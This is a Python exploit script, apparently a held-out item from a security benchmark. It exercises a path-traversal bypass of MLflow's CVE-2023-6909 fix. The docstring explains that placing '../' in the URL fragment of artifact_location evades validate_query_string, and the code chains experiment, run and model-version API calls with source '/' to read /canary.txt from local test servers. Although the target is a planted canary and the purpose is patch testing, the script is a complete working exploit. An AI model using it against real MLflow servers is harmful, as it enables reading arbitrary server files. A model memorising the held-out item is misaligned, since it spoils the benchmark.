#!/usr/bin/env python3
"""[HELD-OUT] CVE-2024-3848 residual exploit: fragment traversal in artifact_location.

The CVE-2023-6909 fix (MLflow 2.9.2+) added validate_query_string which
catches '..' in the URL query string of artifact_location.  However, the
URL fragment (after '#') was NOT validated.

By using 'http://host#/../../../../...' instead of '/tmp/pcb?/../../../../...',
the traversal path lands in the fragment (not the query), bypassing
validate_query_string.

Chain (identical to original, but '?' replaced by '#'):
  1. Create experiment with artifact_location = "http://host#/../../../../../../../../"
     urlparse -> query="" (empty), fragment="/../../../../../../../../"
     V1: validate_query_string("") passes; no fragment check -> allowed
     V2: fragment check added in _create_experiment -> BLOCKED
  2. Create run in this experiment.
  3. Register model + model version with source="/" and run_id.
     _validate_source:
       run_artifact_dir = Path(local_file_uri_to_path(run.info.artifact_uri)).resolve()
       The raw URI string 'http:/host/<run_id>/artifacts#/../..' is treated as
       a filesystem path by local_file_uri_to_path (not a file: URI). The '#'
       becomes a literal char 'artifacts#', and '../' resolves upward to '/'.
       run_artifact_dir == PosixPath('/') -> source '/' is allowed.
  4. GET /model-versions/get-artifact?path=canary.txt  -> reads /canary.txt

Benign benchmark canary: reads a planted random PCB_FLAG token from /canary.txt.
"""
import json
import os
import sys
import time
import requests

BASE = {"v0": "http://127.0.0.1:40290", "v1": "http://127.0.0.1:40291", "v2": "http://127.0.0.1:40292"}


def run(version="v1"):
    base = BASE[version]
    s = requests.Session()

    # Unique names to avoid collisions
    ts = str(int(time.time() * 1000))
    exp_name = f"pcb_bypass_{ts}"
    model_name = f"pcb_model_bypass_{ts}"

    # 1. Create experiment with fragment traversal
    artifact_loc = "http://host#/../../../../../../../../"
    r = s.post(f"{base}/api/2.0/mlflow/experiments/create",
               json={"name": exp_name, "artifact_location": artifact_loc})
    if r.status_code != 200:
        return f"BLOCKED:create_experiment:{r.status_code}:{r.text[:200]}"
    exp_id = r.json()["experiment_id"]

    # 2. Create run
    r = s.post(f"{base}/api/2.0/mlflow/runs/create",
               json={"experiment_id": exp_id})
    if r.status_code != 200:
        return f"ERROR:create_run:{r.status_code}:{r.text[:200]}"
    run_id = r.json()["run"]["info"]["run_id"]

    # 3. Register model + version pointing at filesystem root
    r = s.post(f"{base}/api/2.0/mlflow/registered-models/create",
               json={"name": model_name})
    if r.status_code != 200:
        return f"ERROR:create_model:{r.status_code}:{r.text[:200]}"

    r = s.post(f"{base}/api/2.0/mlflow/model-versions/create",
               json={"name": model_name, "source": "/", "run_id": run_id})
    if r.status_code != 200:
        return f"BLOCKED:create_version:{r.status_code}:{r.text[:200]}"

    # 4. Read canary via model-version artifact download
    r = s.get(f"{base}/model-versions/get-artifact",
              params={"path": "canary.txt", "name": model_name, "version": "1"})
    if r.status_code != 200:
        return f"ERROR:get_artifact:{r.status_code}:{r.text[:200]}"

    return r.text


if __name__ == "__main__":
    ver = sys.argv[1] if len(sys.argv) > 1 else "v1"
    print(run(version=ver))
